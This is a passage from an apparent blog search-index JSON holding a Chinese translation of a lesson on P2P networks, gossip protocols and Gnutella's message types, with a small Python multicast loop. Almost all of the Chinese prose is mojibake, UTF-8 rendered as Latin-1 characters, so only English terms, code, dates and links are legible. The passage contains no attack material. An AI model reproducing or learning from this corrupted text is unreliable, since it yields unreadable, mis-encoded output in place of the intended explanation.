è¿™å°±æ˜¯ä¸ºä»€ä¹ˆåˆ°äº†2009å¹´ï¼ŒP2Påè®®åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå·²ç»è½ä¼äº†ã€‚åœ¨æ–‡ä»¶å…±äº«ç½‘ç»œä¹‹å¤–ï¼Œé‡‡ç”¨å¤§è§„æ¨¡P2Pç³»ç»Ÿçš„æ–°åº”ç”¨ä¸å¤šã€‚ å°½ç®¡å¦‚æ­¤ï¼Œä¸­æœ¬èªæ˜ç™½ï¼ŒP2Pæ¶æ„æ˜¯åˆ›å»ºä¸€ä¸ªæœ‰å¼¹æ€§çš„ã€å»ä¸­å¿ƒåŒ–çš„è´§å¸åè®®çš„å”¯ä¸€å¯è¡Œçš„æ–¹æ³•ã€‚ä¸­æœ¬èªå†™é“: æ”¿åºœå–„äºç æ‰åƒNapsterè¿™æ ·çš„ä¸­å¤®æ§åˆ¶ç½‘ç»œçš„è„‘è¢‹ï¼Œä½†åƒGnutellaå’ŒTorè¿™æ ·çš„çº¯P2Pç½‘ç»œä¼¼ä¹åœ¨åšæŒè‡ªå·±çš„è§‚ç‚¹ã€‚ ","date":"2022-08-23","objectID":"/p2p/:1:4","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"P2Pæ¶æ„çš„æƒè¡¡å› ç´ æ˜¯ä»€ä¹ˆï¼Ÿ å»ä¸­å¿ƒåŒ–å¹¶ä¸æ˜¯å…è´¹çš„ã€‚å½“ä¸­æœ¬èªä¸ºæ¯”ç‰¹å¸é€‰æ‹©P2Pæ¶æ„æ—¶ï¼Œæœ‰ä¸‰ä¸ªå¤§çš„éšœç¢ä¸å¾—ä¸æ¥å—ã€‚ ç¬¬ä¸€ä¸ªéšœç¢æ˜¯ï¼šåœ¨é›†ä¸­å¼æ¶æ„ä¸­ï¼Œä½ é€šå¸¸å¯ä»¥å¾—åˆ°å…¨å±€çŠ¶æ€çš„ä¸€ä¸ªè¿è´¯çš„å¿«ç…§ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œä½ å¯ä»¥æ¸…æ¥šåœ°è§‚å¯Ÿæ­£åœ¨å‘ç”Ÿçš„ä¸€åˆ‡ï¼‰ã€‚ä½†åœ¨P2Påè®®ä¸­ï¼Œé€šå¸¸ä¸å¯èƒ½å¾—åˆ°è¿™ç§å…¨çƒå¿«ç…§ã€‚P2PèŠ‚ç‚¹åªå­˜å‚¨è‡ªå·±çš„æœ¬åœ°çŸ¥è¯†ï¼Œè¦æŠŠç½‘ç»œä¸­æ­£åœ¨å‘ç”Ÿçš„äº‹æƒ…æ‹¼å‡‘æˆä¸€ä¸ªä¸€è‡´çš„ç”»é¢æ˜¯ç›¸å½“æœ‰æŒ‘æˆ˜æ€§çš„ã€‚ ä¾‹å¦‚ï¼Œåœ¨IPè·¯ç”±ä¸­å°±æ˜¯å¦‚æ­¤ã€‚åœ¨IPè·¯ç”±ä¸­ï¼Œæ²¡æœ‰ä¸€ä¸ªè·¯ç”±å™¨æ‹¥æœ‰æ•´ä¸ªäº’è”ç½‘çš„è·¯ç”±è¡¨ã€‚è·¯ç”±å™¨å°†æ•°æ®åŒ…ä¼ é€’ç»™ä»–ä»¬æ‰€çŸ¥é“çš„ä¸‹ä¸€ä¸ªæœ€è¿‘çš„èŠ‚ç‚¹ï¼Œç›¸ä¿¡æ‹¥æœ‰æ›´å¤šæœ¬åœ°ä¿¡æ¯çš„èŠ‚ç‚¹èƒ½å¤Ÿå°†æ•°æ®åŒ…æ›´æ¥è¿‘å…¶ç›®çš„åœ°ã€‚ å› æ­¤ï¼Œå‘ˆç°äº’è”ç½‘ä¸­æ´»åŠ¨çš„å…¨çƒå¿«ç…§è¢«è¯æ˜æ˜¯ç›¸å½“å…·æœ‰æŒ‘æˆ˜æ€§çš„ã€‚ P2Påè®®çš„ç¬¬äºŒä¸ªç¼ºç‚¹æ˜¯ï¼Œéšç€ç”¨æˆ·çš„ä¸Šçº¿å’Œä¸‹çº¿ï¼Œå®ƒä»¬çš„æµå¤±ç‡å¾€å¾€å¾ˆé«˜ã€‚è¿™æ„å‘³ç€ä»»ä½•P2Påè®®å¿…é¡»å…·æœ‰é«˜åº¦çš„å®¹é”™æ€§æ‰èƒ½ä½¿ç”¨ã€‚é›†ä¸­å¼æ¶æ„é€šå¸¸ä¸éœ€è¦åƒP2Pç³»ç»Ÿé‚£æ ·çš„å®¹é”™ç¨‹åº¦ã€‚ ä½†æ˜¯ï¼ŒP2Påè®®æ‰€é¢ä¸´çš„æœ€å¤§éšœç¢å¯èƒ½æ˜¯å®ƒä»¬ä¸èƒ½è½»æ˜“åœ°å®æ–½è´¨é‡æ§åˆ¶ã€‚å› ä¸ºP2Pçš„æˆå‘˜èµ„æ ¼é€šå¸¸æ˜¯å®Œå…¨å¼€æ”¾çš„ï¼Œä»»ä½•æ¶æ„è¡Œä¸ºè€…éƒ½å¯ä»¥è‡ªç”±åœ°åŠ å…¥ç½‘ç»œå¹¶å¼•èµ·éªšä¹±ã€‚åœ¨ä¸€ä¸ªä¸­å¿ƒåŒ–çš„æœåŠ¡ä¸­ï¼Œé˜»æ­¢è¿™æ ·çš„ä¸è‰¯è¡Œä¸ºè€…æ˜¯å¾ˆç›´æ¥çš„ã€‚ä½†åœ¨ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„P2Pç½‘ç»œä¸­ï¼Œè°æ¥å†³å®šè°æ˜¯åäººï¼Œè°æ˜¯å¥½äººï¼Ÿä¸€ä¸ªè®¾è®¡ä¸è‰¯çš„èŠ‚åˆ¶åŠŸèƒ½å¯èƒ½ä¼šè®©åçš„è¡Œä¸ºè€…é˜»æ­¢å¥½çš„ç”¨æˆ·ã€‚è¿™æ„å‘³ç€ä»»ä½•P2Pç½‘ç»œéƒ½å¿…é¡»è¢«ç²¾å¿ƒè®¾è®¡ï¼Œä»¥ä¾¿å³ä½¿æœ‰æ¶æ„ç”¨æˆ·å­˜åœ¨ï¼Œç½‘ç»œä¹Ÿæ— æ³•è¢«é¢ è¦†ã€‚ å°½ç®¡æœ‰è¿™äº›æƒè¡¡ï¼Œå¯¹ä¸­æœ¬èªæ¥è¯´ï¼ŒP2Pç½‘ç»œçš„ç‰¹æ€§å¯¹å»ä¸­å¿ƒåŒ–çš„è´§å¸æ¥è¯´æ˜¯å¿…è¦çš„ã€‚ è‡³æ­¤ï¼Œæˆ‘ä»¬å¯¹P2Påè®®çš„å†å²æ¦‚è¿°ç»“æŸã€‚åœ¨ä¸‹ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ·±å…¥ç ”ç©¶ä¸€ä¸ªè‘—åä½†ç®€å•çš„P2Påè®®ï¼ŒGnutellaã€‚Gnutellaå°†ä¸ºæˆ‘ä»¬æä¾›ä¸€ä¸ªå…«å¦åè®®çš„è“å›¾ï¼Œæœ€ç»ˆå°†å¸®åŠ©æˆ‘ä»¬ç†æ¸…æ¯”ç‰¹å¸è‡ªå·±çš„ç½‘ç»œæ¨¡å‹ã€‚ ","date":"2022-08-23","objectID":"/p2p/:1:5","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"Gnutella: an Intro to Gossip Gnutella (/nÊŠËˆtÉ›lÉ™/) åŠªç‰¹æ‹‰ æ˜¯Napsteræ­»åå‡ºç°çš„ç¬¬ä¸€æ‰¹åˆ†æ•£å¼æ–‡ä»¶å…±äº«åè®®ä¹‹ä¸€ã€‚å®ƒåœ¨æ–‡ä»¶å…±äº«åº”ç”¨ç¨‹åºLimeWireä¸­å¾—åˆ°äº†æœ€å¹¿æ³›çš„å®æ–½ã€‚ è¯‘è€…æ³¨: LimeWireé‡æ–°ä¸Šçº¿åæ”¹ä¸ºæNFTäº† ä½œä¸ºä¸€ä¸ªç›¸å½“ç®€å•çš„åŸºäº gossip [/â€˜gÉ’sÉªp/] çš„ P2P åè®®ï¼ŒGnutella çš„ç½‘ç»œè®¾è®¡æ˜¯ç†è§£æ¯”ç‰¹å¸çš„ä¸€ä¸ªå¾ˆå¥½çš„è“å›¾ã€‚åœ¨æœ¬è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†ä»æ·±å…¥ç ”ç©¶ gossip åè®®çš„ç†è®ºå¼€å§‹ã€‚ç„¶åæˆ‘ä»¬å°†ä»‹ç» Gnutella çš„è®¾è®¡ã€‚ç„¶åï¼Œåœ¨ä½œä¸šä¸­ï¼Œæ‚¨å°†æ„å»ºè‡ªå·±çš„ Gnutella å¼åè®®ã€‚ Gnutella æ˜¯ gossip çš„ä¸€ä¸ªå¾ˆå¥½çš„å…¥å£ç‚¹ï¼Œå› ä¸ºå®ƒæ˜¯ç”Ÿäº§ä¸­ä½¿ç”¨çš„æœ€ç®€å•çš„ gossip åè®®ä¹‹ä¸€ã€‚ä½†æ˜¯gossipåè®®è‡ª 90 å¹´ä»£å°±å·²ç»å­˜åœ¨ï¼Œå¹¶å·²ç”¨äºè®¸å¤šç³»ç»Ÿï¼Œä¾‹å¦‚æ— çº¿ç½‘ç»œã€ä¼ æ„Ÿå™¨ï¼Œå½“ç„¶è¿˜æœ‰äº’è”ç½‘è·¯ç”±ã€‚ä»Šå¤©ï¼Œè®¸å¤šåˆ†å¸ƒå¼æ•°æ®åº“ï¼Œå¦‚ Cassandraã€Riak å’Œ Voldemortï¼Œéƒ½ä½¿ç”¨ gossip æ¥ä¼ æ’­å†…éƒ¨çŠ¶æ€æ›´æ–°ã€‚ é‚£ä¹ˆä¸ºä»€ä¹ˆé€‰æ‹©gossipå‘¢ï¼Ÿå®ƒæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ æç‚¼å…¶æœ¬è´¨ï¼Œgossipåªæ˜¯ä¸€ç§è¿›è¡Œåˆ†æ•£æ¶ˆæ¯ä¼ æ’­çš„æ–¹å¼ã€‚ ","date":"2022-08-23","objectID":"/p2p/:2:0","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"å¤šæ’­(multicast, ç»„æ’­)é—®é¢˜ ä½ å¯èƒ½å¾ˆç†Ÿæ‚‰å¹¿æ’­(broadcast)è¿™ä¸ªè¯ã€‚å¹¿æ’­æ˜¯å‘ç½‘ç»œä¸­çš„æ¯ä¸ªèŠ‚ç‚¹å‘é€æ¶ˆæ¯ã€‚å¤šæ’­æ˜¯æŒ‡ä½ æƒ³å‘è®¸å¤šæ–¹é¢å‘é€æ¶ˆæ¯ï¼Œä½†ä¸æ˜¯æ•´ä¸ªç½‘ç»œä¸­çš„æ¯ä¸ªäººã€‚å¦‚æœä½ æƒ³åœ¨P2Pæ–‡ä»¶å…±äº«ç½‘ç»œä¸­è¿›è¡Œæœç´¢æŸ¥è¯¢ï¼Œä½ å®é™…ä¸Šå¹¶ä¸æƒ³æŠŠå®ƒå‘é€ç»™ç½‘ç»œä¸­çš„æ¯ä¸ªäººâ€“å¦‚æœä½ è¿™æ ·åšï¼Œç½‘ç»œä¼šå¾ˆå¿«è¿‡è½½ã€‚åªæœ‰ç½‘ç»œä¸­çš„ä¸€ä¸ªå­é›†éœ€è¦å¯¹æˆ‘ä»¬çš„æŸ¥è¯¢åšå‡ºå®é™…å›åº”ã€‚ é‚£ä¹ˆï¼Œä»€ä¹ˆæ˜¯æ‰§è¡Œè¿™ç§å¤šæ’­çš„æœ€ä½³æ–¹å¼å‘¢ï¼Ÿ ä½ é¦–å…ˆæƒ³åˆ°çš„å¯èƒ½æ˜¯éå†ä½ æƒ³è”ç³»çš„æ¯ä¸ªäººï¼Œç„¶åå‘ä»–ä»¬å‘é€ä¸€ä¸ªç‚¹å¯¹ç‚¹çš„æ¶ˆæ¯ã€‚ def simple_multicast(recipients, msg): for recipient in recipients: recipient.send(msg) è¿™å¾ˆæœ‰æ•ˆï¼Œä½†æ•ˆç‡ä¸é«˜ã€‚å®ƒéœ€è¦ O(N)æ—¶é—´æ¥æ‰§è¡Œå®Œæ•´çš„ç»„æ’­ã€‚è¿™ä¹Ÿæ˜¯ä¸ç°å®çš„ï¼šå®ƒè¦æ±‚ç½‘ç»œä¸­çš„æ¯ä¸ªäººéƒ½è¦ç»´æŠ¤ç½‘ç»œä¸­æ¯ä¸ªå…¶ä»–èŠ‚ç‚¹çš„åˆ—è¡¨ã€‚åœ¨ä¸€ä¸ªP2Pç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªåˆ—è¡¨å¯èƒ½æ˜¯å·¨å¤§çš„ï¼Œå¹¶ä¸”ä¼šå› ä¸ºèŠ‚ç‚¹çš„æµå¤±è€Œä¸€ç›´å˜åŒ–ã€‚(å¦å¤–ï¼Œå¦‚æœå‘é€è€…åœ¨è¿™ä¸ªé•¿çš„ç»„æ’­è¿‡ç¨‹ä¸­å¤±è´¥äº†ï¼Œæ•´ä¸ªæ“ä½œå°±ä¼šå¤±è´¥ï¼‰ã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•æ‰èƒ½åœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œæ”¹è¿›å‘¢ï¼Ÿ ä¼˜åŒ–ä¿¡æ¯ä¼ æ’­çš„ä¸€ä¸ªæ–¹æ³•æ˜¯å»ºç«‹ä¸€ä¸ªæœ€å°ç”Ÿæˆæ ‘ã€‚ç”Ÿæˆæ ‘æ˜¯ä¸€æ£µè¦†ç›–å›¾ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„æ ‘ã€‚æœ€å°ç”Ÿæˆæ ‘æ˜¯å¯èƒ½çš„æœ€å°ç”Ÿæˆæ ‘â€“æ¢å¥è¯è¯´ï¼Œæ˜¯ç”¨æœ€å°‘çš„è¾¹æ•°ï¼ˆæˆ–æœ€å°çš„æ€»è¾¹æƒé‡ï¼‰å»ºç«‹çš„ç”Ÿæˆæ ‘ã€‚ ä¸‹é¢æ˜¯è¿™ä¸ªå›¾çš„æœ€å°ç”Ÿæˆæ ‘ã€‚å¦‚æœæˆ‘ä»¬è¯•å›¾ä»ç»¿è‰²èŠ‚ç‚¹å¹¿æ’­ä¸€æ¡ä¿¡æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰€æœ‰çš„ä¿¡æ¯éƒ½å°†æ²¿ç€è¿™æ£µæ ‘è¢«ä¼ é€ã€‚ï¼ˆæœ‰å¤šä¸ªé«˜åº¦ä¸º2çš„ç”Ÿæˆæ ‘ï¼Œè¿™åªæ˜¯å…¶ä¸­ä¹‹ä¸€ï¼‰ã€‚ è¿™åº”è¯¥æ˜¯å®ç°äº†ä¸€ä¸ªå¹¿æ’­åœ¨åªæœ‰ O(logN) è·³ï¼Œå› ä¸ºæ¶ˆæ¯çš„ä¼ æ’­æ—¶é—´å°†ä¸æ ‘çš„æ·±åº¦æˆæ­£æ¯”ã€‚æ­¤å¤–ï¼Œæ¯ä¸ªèŠ‚ç‚¹åœ¨è¯¥å¹¿æ’­ä¸­åªéœ€è¦æ‰§è¡Œå°‘é‡çš„æ“ä½œï¼Œè€Œä¸æ˜¯ç”±å‘é€è€…æ‰§è¡Œä¸€ä¸ªå¤§è§„æ¨¡çš„ O(N)æ“ä½œï¼ˆè¿™å¯¹ä¸€ä¸ªå¤§å‹ç½‘ç»œæ¥è¯´æ˜¯ä¸å¯è¡Œçš„ï¼‰ã€‚ è¿™å¾ˆå¥½! äº‹å®ä¸Šï¼Œå®ƒæ˜¯å¦‚æ­¤ä¹‹å¥½ï¼Œä»¥è‡³äºåœ¨ç†è®ºä¸Šæ˜¯æœ€ä¼˜çš„ã€‚æœ€å°ç”Ÿæˆæ ‘ä¸ºæˆ‘ä»¬æä¾›äº†æœ€å¤§æ•ˆç‡çš„è·¯ç”±ï¼Œç‰¹åˆ«æ˜¯å¦‚æœç”Ÿæˆæ ‘æ˜¯åœ¨è€ƒè™‘åˆ°åŸºç¡€ç½‘ç»œæ‹“æ‰‘ç»“æ„çš„æƒ…å†µä¸‹æ„å»ºçš„ã€‚ ä½†æ˜¯ç”Ÿæˆæ ‘æœ‰ä¸€ä¸ªå¾ˆå¤§çš„é—®é¢˜ï¼šå®ƒä»¬éå¸¸è„†å¼±ã€‚å¦‚æœå“ªæ€•åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹å‘ç”Ÿæ•…éšœæˆ–é€€å‡ºç½‘ç»œï¼Œæ•´ä¸ªæ ‘çš„åŠ¨è„‰å°±ä¼šè¢«å‡»æ–­ï¼Œå˜å¾—æ— æ³•åˆ°è¾¾ã€‚åœ¨P2Pç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬å¿…é¡»å‡è®¾èŠ‚ç‚¹ä¼šå´©æºƒï¼Œæ•°æ®åŒ…ä¼šè¢«ä¸¢å¼ƒï¼Œç½‘ç»œæ‹“æ‰‘ç»“æ„ä¼šéšç€æ—¶é—´è€Œæ”¹å˜ã€‚å½“ç½‘ç»œæ˜¯é™æ€çš„æ—¶å€™ï¼Œç”Ÿæˆæ ‘æ˜¯å¾ˆå¥½çš„ï¼Œä½†åœ¨P2Pç½‘ç»œä¸­(ç½‘ç»œèŠ‚ç‚¹æ˜¯åŠ¨æ€çš„)ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸å¯èƒ½çš„äº‹æƒ…ã€‚ è¯‘è€…æ³¨: æœ€å°ç”Ÿæˆæ ‘: https://zh.wikipedia.org/wiki/æœ€å°ç”Ÿæˆæ ‘ ","date":"2022-08-23","objectID":"/p2p/:2:1","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"è¿›å…¥gossipåè®® [/â€˜gÉ’sÉªp/] â€œæµè¨€ç®—æ³•â€ã€â€œå…«å¦ç®—æ³•â€ã€â€œç˜Ÿç–«ç®—æ³•â€ å¦‚æœæˆ‘ä»¬æƒ³è¦ç”Ÿæˆæ ‘çš„å¯æ‰©å±•æ€§ï¼Œè€Œåˆæ²¡æœ‰è„†æ€§ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨gossipã€‚gossipåè®®çš„åŸç†å¾ˆç®€å•ï¼Œä½ å¯èƒ½å·²ç»æœ‰äº†å®ƒä»¬å¦‚ä½•å·¥ä½œçš„ç›´è§‰ã€‚ åœ¨ä¼ ç»Ÿçš„gossipåè®®ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹å®šæœŸå‘Kä¸ªéšæœºç›®æ ‡\"ä¼ æŸ“â€ã€‚è¿™ä¸ªKè¢«ç§°ä¸ºæ„ŸæŸ“å› å­ï¼ˆä½œä¸ºå¯¹æµè¡Œç—…å­¦çš„ä¸€ä¸ªç‚¹å­ï¼‰ã€‚ä¸€æ—¦è¿™äº› K ç›®æ ‡æ”¶åˆ°æ¶ˆæ¯åï¼Œä»–ä»¬ä¼šéšæœºé€‰æ‹©å¦ä¸€ä¸ª K çš„ç›®æ ‡è¿›è¡Œé—²èŠã€‚è¿™ç§æƒ…å†µä¸€ç›´æŒç»­åˆ°æ‰€æœ‰å¯åˆ°è¾¾çš„èŠ‚ç‚¹éƒ½æ”¶åˆ°æ¶ˆæ¯ï¼Œæˆ–è€…æ¶ˆæ¯è¿‡æœŸã€‚ ä¸‹å›¾ä¸­k=3 (å¿½ç•¥é‡å¤) æ„ŸæŸ“å› å­è¶Šå¼ºï¼Œä¿¡æ¯ä¼ æ’­çš„é€Ÿåº¦è¶Šå¿«ï¼Œè¶Šå½»åº•ã€‚å¦ä¸€æ–¹é¢ï¼Œæ„ŸæŸ“å› å­è¶Šé«˜ï¼Œç½‘ç»œä¸­äº§ç”Ÿçš„å™ªéŸ³å°±è¶Šå¤šï¼Œæ¯æ¡æ¶ˆæ¯æ¶ˆè€—çš„å¸¦å®½å°±è¶Šå¤šã€‚ å¦‚æœä¸€ä¸ªèŠ‚ç‚¹å‘ä»–ä»¬æ‰€æœ‰çš„åŒä¼´ä¼ é€’æ¶ˆæ¯ï¼Œè¿™å°±è¢«ç§°ä¸ºæ³›æ»¥(flooding)ã€‚æ¯”ç‰¹å¸æ‰§è¡Œçš„æ˜¯æ³›æ»¥è€Œä¸æ˜¯éšæœºæ„ŸæŸ“ã€‚ åƒè®¸å¤šéšæœºåè®®ä¸€æ ·ï¼Œgossipæ˜¯ä¸å®Œç¾çš„ï¼Œä½†å®ƒæœ€ç»ˆè¿‘ä¼¼äºæœ€å°ç”Ÿæˆæ ‘çš„å±æ€§ï¼ˆæœ‰å¾ˆé«˜çš„æ¦‚ç‡ï¼‰ã€‚åŒæ—¶ï¼Œå®ƒæä¾›äº†æ›´é«˜çš„å®¹é”™æ€§ã€‚ gossipåè®®å¯¹P2Pç½‘ç»œæ¥è¯´æœ‰å‡ ä¸ªç†æƒ³çš„ç‰¹æ€§ã€‚ å¯é æ€§: åªæœ‰ä¸€å°éƒ¨åˆ†ç›®æ ‡æ”¶ä»¶äººæ— æ³•æ”¶åˆ°ä½ çš„å¹¿æ’­ã€‚ ä½å»¶æ—¶: O(logN) éå¸¸é«˜çš„å®¹é”™ç‡ è¿™ä½¿å¾—gossipæˆä¸ºåƒæ¯”ç‰¹å¸è¿™æ ·çš„ç³»ç»Ÿä¸­ä¿¡æ¯ä¼ æ’­çš„ä¸»è¦å€™é€‰äººã€‚ æ‰€ä»¥ï¼Œåœ¨æˆ‘ä»¬æŒæ¡äº†ä¸€ç‚¹gossipç†è®ºåï¼Œè®©æˆ‘ä»¬çœ‹çœ‹Gnutellaæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚ æ›´å¤šçš„,å‚è€ƒè¿™é‡Œ https://managementfromscratch.wordpress.com/2016/04/01/introduction-to-gossip/ ","date":"2022-08-23","objectID":"/p2p/:2:2","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"Gnutellaåè®® /nÊŠËˆtÉ›lÉ™/ åŠªç‰¹æ‹‰ Gnutellaçš„è®¾è®¡å§‹äºä¸€ä¸ªç®€å•çš„æƒ³æ³•ï¼šè®©æˆ‘ä»¬é‡‡ç”¨ä¸€ä¸ªåƒNapsterä¸€æ ·çš„æ–‡ä»¶å…±äº«ç³»ç»Ÿï¼Œä½†å»æ‰ä¸­å¤®æœåŠ¡å™¨ã€‚ ä½ ä¼šè®°å¾—ï¼ŒNapsteræœ‰ä¸€ä¸ªä¸­å¤®æœåŠ¡å™¨ï¼ˆæˆ–ä¸€ç»„æœåŠ¡å™¨ï¼‰ï¼Œä½œä¸ºæ‰€æœ‰å¯ç”¨æ–‡ä»¶çš„æœç´¢å¼•æ“è¿è¡Œï¼Œå¹¶å…è®¸å¯¹ç­‰è€…æ‰¾åˆ°å½¼æ­¤ã€‚åœ¨Gnutellaä¸­ï¼ŒP2Pç¾¤ç»„å°†è‡ªå·±å¤„ç†æœç´¢è¯·æ±‚å’Œå¯¹ç­‰ä½“çš„å‘ç°ã€‚ åœ¨Gnutellaä¸­ï¼Œæ¯ä¸ªå®¢æˆ·éƒ½åŒæ—¶ä½œä¸ºå®¢æˆ·å’ŒæœåŠ¡å™¨ï¼ˆGnutellaç§°ä»–ä»¬ä¸º â€œæœåŠ¡è€…â€ï¼‰ã€‚å®¢æˆ·ç«¯é€šè¿‡P2På åŠ å›¾(P2P overlay graph)ç›´æ¥è¿æ¥åˆ°å¯¹æ–¹ã€‚ overlay graphæ˜¯ â€œè¦†ç›– â€œåœ¨å®é™…åŸºç¡€ç½‘ç»œä¹‹ä¸Šçš„P2Pç½‘ç»œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåº•å±‚ç½‘ç»œæ˜¯IPæœ¬èº«â€“è¿™å°±æ˜¯èŠ‚ç‚¹å¿…é¡»å‘å¯¹æ–¹å‘é€æ•°æ®åŒ…çš„æ–¹å¼ã€‚åœ¨åº•å±‚ç½‘ç»œä¸­ï¼ˆä¹Ÿç§°ä¸º â€œåº•å±‚â€ï¼‰ï¼Œå…±äº«ä¸€ä¸ªå¤§å‰ç¼€çš„ä¸¤ä¸ªIPå°†åœ¨ç‰©ç†ä¸Šç›¸äº’é è¿‘ã€‚ä½†P2P overlay graphä¸ä¸€å®šå°Šé‡åŸºç¡€è·ç¦»ã€‚å åŠ å›¾ä¸­çš„é‚»è¿‘åŒä¼´åœ¨ç‰©ç†ä¸–ç•Œä¸­å¯èƒ½å¾ˆè¿œï¼Œè€Œç°å®ä¸–ç•Œä¸­çš„é‚»å±…åœ¨P2På›¾ä¸­å¯èƒ½å¾ˆè¿œã€‚ åªè¦è¦†ç›–ç½‘ç»œå¯¹åº•å±‚ç½‘ç»œæ‹“æ‰‘ä¸æ•æ„Ÿï¼Œä½ å°±ä¼šå¾—åˆ°æ¬¡ä¼˜çš„è·¯ç”±ï¼Œå› ä¸ºä¿¡æ¯ä¸æ˜¯èµ°ç°å®ä¸–ç•Œçš„æœ€çŸ­è·¯å¾„ã€‚æ›´å…ˆè¿›çš„P2Pç³»ç»Ÿè¯•å›¾ä½¿ç”¨æ›´èªæ˜çš„è·¯ç”±æ¨¡å‹ï¼Œå°†åº•å±‚ç½‘ç»œè€ƒè™‘åœ¨å†…ï¼Œä½†æœ€ç®€å•çš„æ–¹æ³•æ˜¯å»ºç«‹ä¸€ä¸ªéç»“æ„åŒ–çš„ç½‘ç»œï¼Œå®ƒäº§ç”Ÿè‡ªå·±çš„éšæœºæ‹“æ‰‘ç»“æ„ï¼Œå¹¶åœ¨ä¿¡æ¯è·¯ç”±æ—¶éµå¾ªè¯¥ç»“æ„ã€‚Gnutellaæ˜¯ä¸€ä¸ªéç»“æ„åŒ–çš„ç½‘ç»œï¼Œæ¯”ç‰¹å¸ä¹Ÿæ˜¯å¦‚æ­¤ï¼ˆæœ‰ä¸€äº›æ³¨æ„äº‹é¡¹æˆ‘ä»¬å°†åœ¨åé¢è®¨è®ºï¼‰ã€‚ ","date":"2022-08-23","objectID":"/p2p/:2:3","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"åè®®ç®€è¿° ç°åœ¨ä½ å·²ç»å¯¹Gnutellaçš„å·¥ä½œåŸç†æœ‰äº†ä¸€ä¸ªé«˜å±‚æ¬¡çš„æ¦‚å¿µã€‚è®©æˆ‘ä»¬æ·±å…¥äº†è§£ä¸€ä¸‹æ›´å¤šçš„ç»†èŠ‚ã€‚ åœ¨Gnutellaä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½è·Ÿè¸ªä¸€ä¸ªå¯¹ç­‰ä½“çš„åˆ—è¡¨ï¼ˆä¸ºç®€å•èµ·è§ï¼Œè®©æˆ‘ä»¬è¯´æ¯ä¸ªå¯¹ç­‰ä½“ä¸è¶…è¿‡5ä¸ªï¼‰ã€‚æ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šå®šæœŸå¯¹å…¶å¯¹ç­‰ä½“è¿›è¡Œpingï¼Œä»¥ç¡®ä¿å®ƒä»¬ä»ç„¶åœ¨çº¿ã€‚å¦‚æœä¸€ä¸ªèŠ‚ç‚¹æ³¨æ„åˆ°å®ƒçš„ä»»ä½•ä¸€ä¸ªå¯¹ç­‰ä½“å·²ç»æ¶ˆå¤±äº†å¾ˆä¹…ï¼Œè¯¥èŠ‚ç‚¹å°†å–æ¶ˆä¸ä»–ä»¬çš„å¯¹ç­‰ä½“ï¼Œå¹¶æ‰¾åˆ°å…¶ä»–çš„å¯¹ç­‰ä½“ã€‚ åœ¨Gnutellaåè®®ä¸­ï¼Œæœ‰äº”ç§æ¶ˆæ¯ç±»å‹ã€‚ Message type Description Query æœç´¢æŸä¸ªæ–‡ä»¶å QueryHit å¯¹æœç´¢çš„è‚¯å®šå›å¤ï¼Œè¯´æ˜â€œå˜¿ï¼Œæˆ‘æœ‰ä¸€ä¸ªä¸è¯¥æŸ¥è¯¢åŒ¹é…çš„æ–‡ä»¶â€ Ping æ¢æŸ¥peerä»¥æŸ¥çœ‹ä»–ä»¬æ˜¯å¦è¿˜æ´»ç€ Pong A reply to a Ping Push è¦æ±‚å‘è¯·æ±‚è€…å‘é€ä¸€ä¸ªæ–‡ä»¶ï¼ˆå¦‚æœæ–‡ä»¶æ‰€æœ‰è€…åœ¨é˜²ç«å¢™åé¢ï¼Œé˜»æ­¢äº†ä¼ å…¥çš„è¿æ¥ï¼‰ã€‚ è¿™å°±æ˜¯å…¨éƒ¨ã€‚ä»…ä»…æ˜¯è¿™äº”ç§ä¿¡æ¯ç±»å‹ï¼Œä½ å°±å¯ä»¥åšå¾ˆå¤šäº‹æƒ…äº†! Pingå’ŒPongæ˜¯ç”¨æ¥å‘ç°å¯¹ç­‰äººå’Œå¿ƒè·³çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨å…ˆä¸è€ƒè™‘è¿™äº›ã€‚ Pushæ¶ˆæ¯åªç”¨äºåè°ƒæ–‡ä»¶æ‰€æœ‰è€…åœ¨é˜²ç«å¢™åé¢çš„æ–‡ä»¶ä¸‹è½½ï¼Œæ‰€ä»¥ä¹Ÿå¿½ç•¥å®ƒã€‚ è¯¥åè®®çš„ä¸»è¦å†…å®¹å‘ç”Ÿåœ¨Queryå’ŒQueryHitæ¶ˆæ¯ä¸­ã€‚ æ¯”æ–¹è¯´ï¼Œä½ åœ¨å¯»æ‰¾ä¸€é¦–Metallicaçš„æ­Œæ›²ï¼Œæ‰€ä»¥ä½ æ„å»ºäº†ä¸€ä¸ªQueryæ¶ˆæ¯ã€‚ä½ æƒ³å¹¿æ³›åœ°ä¼ æ’­ä½ çš„æŸ¥è¯¢ï¼Œæ‰€ä»¥ä½ 